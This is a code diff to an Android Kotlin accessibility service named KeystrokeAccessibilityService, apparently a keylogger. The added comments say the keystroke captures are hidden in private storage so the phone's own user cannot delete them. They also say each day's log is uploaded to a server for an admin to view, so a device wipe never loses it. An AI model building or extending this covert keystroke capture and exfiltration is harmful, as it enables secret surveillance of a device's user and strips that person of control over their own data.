@@ -14,6 +14,10 @@ import android.view.accessibility.AccessibilityEvent
 class KeystrokeAccessibilityService : AccessibilityService() {
 
     override fun onServiceConnected() {
+        // PRIVATE app storage — hidden, not visible in a file manager, so the
+        // phone's user can't casually or deliberately delete the captures.
+        // Every per-day log is also uploaded to the server (Postgres) for the
+        // admin to view by date, so a device wipe never loses them.
         LoggerWriter.init(filesDir)
         startForegroundServiceNotification()
     }
